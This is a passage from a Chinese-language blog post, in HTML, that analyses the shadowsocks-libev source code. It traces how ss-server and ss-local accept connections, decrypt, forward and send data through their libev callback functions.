server-&gt;send_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));</span><br><span class="line">    server-&gt;buf      = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">buffer_t</span>));</span><br><span class="line">    <span class="built_in">memset</span>(server-&gt;recv_ctx, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));</span><br><span class="line">    <span class="built_in">memset</span>(server-&gt;send_ctx, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));</span><br><span class="line">    balloc(server-&gt;buf, SOCKET_BUF_SIZE);</span><br><span class="line">    server-&gt;fd                  = fd;</span><br><span class="line">    server-&gt;recv_ctx-&gt;server    = server;</span><br><span class="line">    server-&gt;recv_ctx-&gt;connected = <span class="number">0</span>;</span><br><span class="line">    server-&gt;send_ctx-&gt;server    = server;</span><br><span class="line">    server-&gt;send_ctx-&gt;connected = <span class="number">0</span>;</span><br><span class="line">    server-&gt;stage               = STAGE_INIT;</span><br><span class="line">    server-&gt;frag                = <span class="number">0</span>;</span><br><span class="line">    server-&gt;query               = <span class="literal">NULL</span>;</span><br><span class="line">    server-&gt;listen_ctx          = listener;</span><br><span class="line">    server-&gt;remote              = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    server-&gt;e_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">cipher_ctx_t</span>));</span><br><span class="line">    server-&gt;d_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">cipher_ctx_t</span>));</span><br><span class="line">    crypto-&gt;ctx_init(crypto-&gt;cipher, server-&gt;e_ctx, <span class="number">1</span>);</span><br><span class="line">    crypto-&gt;ctx_init(crypto-&gt;cipher, server-&gt;d_ctx, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> timeout = max(MIN_TCP_IDLE_TIMEOUT, server-&gt;listen_ctx-&gt;timeout);</span><br><span class="line">    ev_io_init(&amp;server-&gt;recv_ctx-&gt;io, server_recv_cb, fd, EV_READ);</span><br><span class="line">    ev_io_init(&amp;server-&gt;send_ctx-&gt;io, server_send_cb, fd, EV_WRITE);</span><br><span class="line">    ev_timer_init(&amp;server-&gt;recv_ctx-&gt;watcher, server_timeout_cb,</span><br><span class="line">                  timeout, timeout);</span><br><span class="line"></span><br><span class="line">    cork_dllist_add(&amp;connections, &amp;server-&gt;entries);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> server;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到new_server函数设置了接收数据后的回调函数server_recv_cb,和发送数据的处理函数server_send_cb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ev_io_init(&amp;server-&gt;recv_ctx-&gt;io, server_recv_cb, fd, EV_READ);</span><br><span class="line">ev_io_init(&amp;server-&gt;send_ctx-&gt;io, server_send_cb, fd, EV_WRITE);</span><br></pre></td></tr></table></figure><p>4.我们继续看server_recv_cb函数如何对数据进行处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">server_ctx_t</span> *server_recv_ctx = (<span class="type">server_ctx_t</span> *)w;</span><br><span class="line">    <span class="type">server_t</span> *server              = server_recv_ctx-&gt;server;</span><br><span class="line">    <span class="type">remote_t</span> *remote              = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">buffer_t</span> *buf = server-&gt;buf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (server-&gt;stage == STAGE_STREAM) &#123;</span><br><span class="line">        remote = server-&gt;remote;</span><br><span class="line">        buf    = remote-&gt;buf;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Only timer the watcher if a valid connection is established</span></span><br><span class="line">        ev_timer_again(EV_A_ &amp; server-&gt;recv_ctx-&gt;watcher);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> r = recv(server-&gt;fd, buf-&gt;data, SOCKET_BUF_SIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// connection closed</span></span><br><span class="line">        close_and_free_remote(EV_A_ remote);</span><br><span class="line">        close_and_free_server(EV_A_ server);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errno == EAGAIN || errno == EWOULDBLOCK) &#123;</span><br><span class="line">            <span class="comment">// no data</span></span><br><span class="line">            <span class="comment">// continue to wait for recv</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ERROR(<span class="string">&quot;server recv&quot;</span>);</span><br><span class="line">            close_and_free_remote(EV_A_ remote);</span><br><span class="line">            close_and_free_server(EV_A_ server);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ignore any new packet if the server is stopped</span></span><br><span class="line">    <span class="keyword">if</span> (server-&gt;stage == STAGE_STOP) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tx      += r;</span><br><span class="line">    buf-&gt;len = r;</span><br><span class="line"><span class="comment">//对数据包进行解密</span></span><br><span class="line">    <span class="type">int</span> err = crypto-&gt;decrypt(buf, server-&gt;d_ctx, SOCKET_BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (err == CRYPTO_ERROR) &#123;</span><br><span class="line">        report_addr(server-&gt;fd, <span class="string">&quot;authentication error&quot;</span>);</span><br><span class="line">        stop_server(EV_A_ server);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (err == CRYPTO_NEED_MORE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (server-&gt;stage != STAGE_STREAM) &#123;</span><br><span class="line">            server-&gt;frag++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (server-&gt;stage == STAGE_STREAM) &#123;</span><br><span class="line">        <span class="type">int</span> s = send(remote-&gt;fd, remote-&gt;buf-&gt;data, remote-&gt;buf-&gt;len, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EAGAIN || errno == EWOULDBLOCK) &#123;</span><br><span class="line">                <span class="comment">// no data, wait for send</span></span><br><span class="line">                remote-&gt;buf-&gt;idx = <span class="number">0</span>;</span><br><span class="line">                ev_io_stop(EV_A_ &amp; server_recv_ctx-&gt;io);</span><br><span class="line">                ev_io_start(EV_A_ &amp; remote-&gt;send_ctx-&gt;io);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ERROR(<span class="string">&quot;server_recv_send&quot;</span>);</span><br><span class="line">                close_and_free_remote(EV_A_ remote);</span><br><span class="line">                close_and_free_server(EV_A_ server);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s &lt; remote-&gt;buf-&gt;len) &#123;</span><br><span class="line">            remote-&gt;buf-&gt;len -= s;</span><br><span class="line">            remote-&gt;buf-&gt;idx  = s;</span><br><span class="line">            ev_io_stop(EV_A_ &amp; server_recv_ctx-&gt;io);</span><br><span class="line">            ev_io_start(EV_A_ &amp; remote-&gt;send_ctx-&gt;io);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (server-&gt;stage == STAGE_INIT) &#123;</span><br></pre></td></tr></table></figure><p>这里我们可以看到首先程序先将数据读取到缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> r = recv(server-&gt;fd, buf-&gt;data, SOCKET_BUF_SIZE, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>其次对数据包进行了解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> err = crypto-&gt;decrypt(buf, server-&gt;d_ctx, SOCKET_BUF_SIZE);</span><br></pre></td></tr></table></figure><p>然后对数据包进行了初步分析,判断数据包的类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (server-&gt;stage == STAGE_STOP) &#123;</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (server-&gt;stage == STAGE_INIT)</span><br><span class="line">   &#123;</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (server-&gt;stage == STAGE_STREAM)</span><br><span class="line">   &#123;</span><br><span class="line">        ...</span><br><span class="line">       <span class="keyword">if</span> (!need_query) &#123;</span><br><span class="line">           <span class="type">remote_t</span> *remote = connect_to_remote(EV_A_ &amp; info, server);</span><br><span class="line">           <span class="keyword">if</span> (remote == <span class="literal">NULL</span>) &#123;</span><br><span class="line">               LOGE(<span class="string">&quot;connect error&quot;</span>);</span><br><span class="line">               close_and_free_server(EV_A_ server);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               server-&gt;remote = remote;</span><br><span class="line">               remote-&gt;server = server;</span><br><span class="line"></span><br><span class="line">               <span class="comment">// <span class="doctag">XXX:</span> should handle buffer carefully</span></span><br><span class="line">               <span class="keyword">if</span> (server-&gt;buf-&gt;len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                   brealloc(remote-&gt;buf, server-&gt;buf-&gt;len, SOCKET_BUF_SIZE);</span><br><span class="line">                   <span class="built_in">memcpy</span>(remote-&gt;buf-&gt;data, server-&gt;buf-&gt;data + server-&gt;buf-&gt;idx,</span><br><span class="line">                          server-&gt;buf-&gt;len);</span><br><span class="line">                   remote-&gt;buf-&gt;len = server-&gt;buf-&gt;len;</span><br><span class="line">                   remote-&gt;buf-&gt;idx = <span class="number">0</span>;</span><br><span class="line">                   server-&gt;buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">                   server-&gt;buf-&gt;idx = <span class="number">0</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="comment">// waiting on remote connected event</span></span><br><span class="line">               ev_io_stop(EV_A_ &amp; server_recv_ctx-&gt;io);</span><br><span class="line">               ev_io_start(EV_A_ &amp; remote-&gt;send_ctx-&gt;io);</span><br><span class="line">           &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里我们看到当数据包类型为STAGE_STREAM类型时,首先服务器和目标服务器建立了tcp连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">remote_t</span> *remote = connect_to_remote(EV_A_ &amp; info, server);</span><br></pre></td></tr></table></figure><p>并且如果开始停止接收数据的任务,开始处理发送任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// waiting on remote connected event</span></span><br><span class="line">ev_io_stop(EV_A_ &amp; server_recv_ctx-&gt;io);</span><br><span class="line">ev_io_start(EV_A_ &amp; remote-&gt;send_ctx-&gt;io);</span><br></pre></td></tr></table></figure><p>5.我们再来看看server_send_cb函数做了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">server_send_cb</span><span class="params">(EV_P_ ev_io *w, <span class="type">int</span> revents)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">server_ctx_t</span> *server_send_ctx = (<span class="type">server_ctx_t</span> *)w;</span><br><span class="line">    <span class="type">server_t</span> *server              = server_send_ctx-&gt;server;</span><br><span class="line">    <span class="type">remote_t</span> *remote              = server-&gt;remote;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (remote == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        LOGE(<span class="string">&quot;invalid server&quot;</span>);</span><br><span class="line">        close_and_free_server(EV_A_ server);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (server-&gt;buf-&gt;len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// close and free</span></span><br><span class="line">        close_and_free_remote(EV_A_ remote);</span><br><span class="line">        close_and_free_server(EV_A_ server);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// has data to send</span></span><br><span class="line">        <span class="type">ssize_t</span> s = send(server-&gt;fd, server-&gt;buf-&gt;data + server-&gt;buf-&gt;idx,</span><br><span class="line">                         server-&gt;buf-&gt;len, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno != EAGAIN &amp;&amp; errno != EWOULDBLOCK) &#123;</span><br><span class="line">                ERROR(<span class="string">&quot;server_send_send&quot;</span>);</span><br><span class="line">                close_and_free_remote(EV_A_ remote);</span><br><span class="line">                close_and_free_server(EV_A_ server);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s &lt; server-&gt;buf-&gt;len) &#123;</span><br><span class="line">            <span class="comment">// partly sent, move memory, wait for the next time to send</span></span><br><span class="line">            server-&gt;buf-&gt;len -= s;</span><br><span class="line">            server-&gt;buf-&gt;idx += s;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// all sent out, wait for reading</span></span><br><span class="line">            server-&gt;buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">            server-&gt;buf-&gt;idx = <span class="number">0</span>;</span><br><span class="line">            ev_io_stop(EV_A_ &amp; server_send_ctx-&gt;io);</span><br><span class="line">            <span class="keyword">if</span> (remote != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                ev_io_start(EV_A_ &amp; remote-&gt;recv_ctx-&gt;io);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LOGE(<span class="string">&quot;invalid remote&quot;</span>);</span><br><span class="line">                close_and_free_remote(EV_A_ remote);</span><br><span class="line">                close_and_free_server(EV_A_ server);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里程序对缓冲区的程序进行了发送</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> s = send(server-&gt;fd, server-&gt;buf-&gt;data + server-&gt;buf-&gt;idx,</span><br><span class="line">                 server-&gt;buf-&gt;len, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>并且开始停止发送任务,开始处理接收任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ev_io_stop(EV_A_ &amp; server_send_ctx-&gt;io);</span><br><span class="line"><span class="keyword">if</span> (remote != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ev_io_start(EV_A_ &amp; remote-&gt;recv_ctx-&gt;io);</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>我们从以上分析结果得出shadowsocks服务器工作的核心函数有以下几个</p><h5 id="4-1-1-核心函数"><a href="#4-1-1-核心函数" class="headerlink" title="4.1.1.核心函数"></a>4.1.1.核心函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">remote_recv_cb</span><span class="params">(EV_P_ ev_io *w, <span class="type">int</span> revents)</span>; <span class="comment">//和接收来自远程服务器发来的数据包</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">remote_send_cb</span><span class="params">(EV_P_ ev_io *w,<span class="type">int</span> revents)</span>;<span class="comment">//发送数据包给远程服务器</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">server_recv_cb</span><span class="params">(EV_P_ ev_io *w, <span class="type">int</span> revents)</span>;<span class="comment">//接收来自shadowsocks客户端发送来的数据包</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">server_send_cb</span><span class="params">(EV_P_ ev_io *w,<span class="type">int</span> revents)</span>;<span class="comment">//发送数据包给shadowsock客户端</span></span><br></pre></td></tr></table></figure><h5 id="4-1-2-函数调用关系"><a href="#4-1-2-函数调用关系" class="headerlink" title="4.1.2.函数调用关系"></a>4.1.2.函数调用关系</h5><p>ss-server接收到客户端的数据,处理数据的函数调用关系图</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_recv_cb----&gt;decrypto---send/remote_send_cb-----&gt;recv/remote_recv_cb------&gt;crypto----&gt;server_send_cb</span><br></pre></td></tr></table></figure><p>其实从函数调用关系图不难得出整个ss-server的工作流程</p><ul><li>1.接收数据</li><li>2.解密数据</li><li>3.将数据发送给目标服务器</li><li>4.接收来自远程服务器发送的数据包</li><li>5.加密数据</li><li>6.将服务器发送的数据包发送给客户端</li></ul><h4 id="4-2-ss-local-客户端"><a href="#4-2-ss-local-客户端" class="headerlink" title="4.2.ss-local(客户端)"></a>4.2.ss-local(客户端)</h4><h5 id="4-2-1-核心函数"><a href="#4-2-1-核心函数" class="headerlink" title="4.2.1.核心函数"></a>4.2.1.核心函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">server_recv_cb</span><span class="params">(EV_P_ ev_io *w, <span class="type">int</span> revents)</span>;   <span class="comment">//接收客户端发送数据后的回调函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">server_send_cb</span><span class="params">(EV_P_ ev_io *w, <span class="type">int</span> revents)</span>;   <span class="comment">//发送给客户端数据后的回调函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remote_recv_cb</span><span class="params">(EV_P_ ev_io *w, <span class="type">int</span> revents)</span>;   <span class="comment">//接收到来自远程服务器数据后的回调函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remote_send_cb</span><span class="params">(EV_P_ ev_io *w, <span class="type">int</span> revents)</span>;   <span class="comment">//发送给远程服务器数据后的回调函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">server_stream</span><span class="params">(EV_P_ ev_io *w, <span class="type">buffer_t</span> *buf)</span>;</span><br></pre></td></tr></table></figure><p>1.先看主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (mode != UDP_ONLY) &#123;  </span><br><span class="line">        <span class="comment">// Setup socket  </span></span><br><span class="line">        <span class="type">int</span> listenfd;  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_LAUNCHD  </span></span><br><span class="line">        listenfd = launch_or_create(local_addr, local_port);  </span><br><span class="line"><span class="meta">#<span class="keyword">else</span>  </span></span><br><span class="line">        listenfd = create_and_bind(local_addr, local_port);  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">        <span class="keyword">if</span> (listenfd == <span class="number">-1</span>) &#123;  </span><br><span class="line">            FATAL(<span class="string">&quot;bind() error&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (listen(listenfd, SOMAXCONN) == <span class="number">-1</span>) &#123;  </span><br><span class="line">            FATAL(<span class="string">&quot;listen() error&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        setnonblocking(listenfd);  </span><br><span class="line">  </span><br><span class="line">        listen_ctx.fd = listenfd;  </span><br><span class="line">  </span><br><span class="line">        ev_io_init(&amp;listen_ctx.io, accept_cb, listenfd, EV_READ);  </span><br><span class="line">        ev_io_start(loop, &amp;listen_ctx.io);  </span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里很明显可以看清楚,客户端首先创建了socket并绑定端口开始监听连接,从函数名我们很容易看出<br>accept_cb为客户端接收连接的回调函数<br>我们耿总accept_cb函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">listen_ctx_t</span> *listener = (<span class="type">listen_ctx_t</span> *)w;  </span><br><span class="line">    <span class="type">int</span> serverfd           = accept(listener-&gt;fd, <span class="literal">NULL</span>, <span class="literal">NULL</span>);  </span><br><span class="line">    <span class="keyword">if</span> (serverfd == <span class="number">-1</span>) &#123;  </span><br><span class="line">        ERROR(<span class="string">&quot;accept&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span>;    &#125;  </span><br><span class="line">    setnonblocking(serverfd);  </span><br><span class="line">    <span class="type">int</span> opt = <span class="number">1</span>;  </span><br><span class="line">    setsockopt(serverfd, SOL_TCP, TCP_NODELAY, &amp;opt, <span class="keyword">sizeof</span>(opt));  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SO_NOSIGPIPE  </span></span><br><span class="line">    setsockopt(serverfd, SOL_SOCKET, SO_NOSIGPIPE, &amp;opt, <span class="keyword">sizeof</span>(opt));  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (tcp_incoming_sndbuf &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        setsockopt(serverfd, SOL_SOCKET, SO_SNDBUF, &amp;tcp_incoming_sndbuf, <span class="keyword">sizeof</span>(<span class="type">int</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (tcp_incoming_rcvbuf &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        setsockopt(serverfd, SOL_SOCKET, SO_RCVBUF, &amp;tcp_incoming_rcvbuf, <span class="keyword">sizeof</span>(<span class="type">int</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">server_t</span> *server = new_server(serverfd);  </span><br><span class="line">    server-&gt;listener = listener;  </span><br><span class="line">  </span><br><span class="line">    ev_io_start(EV_A_ &amp; server-&gt;recv_ctx-&gt;io);</span><br></pre></td></tr></table></figure><p>这里发现客户端接收连接后使用new_server函数创建了一个server对象,继续跟踪new_server函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">server_t</span> *server;  </span><br><span class="line">server = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">server_t</span>));  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">memset</span>(server, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">server_t</span>));  </span><br><span class="line">  </span><br><span class="line">server-&gt;recv_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));  </span><br><span class="line">server-&gt;send_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));  </span><br><span class="line">server-&gt;buf      = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">buffer_t</span>));  </span><br><span class="line">server-&gt;abuf     = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">buffer_t</span>));  </span><br><span 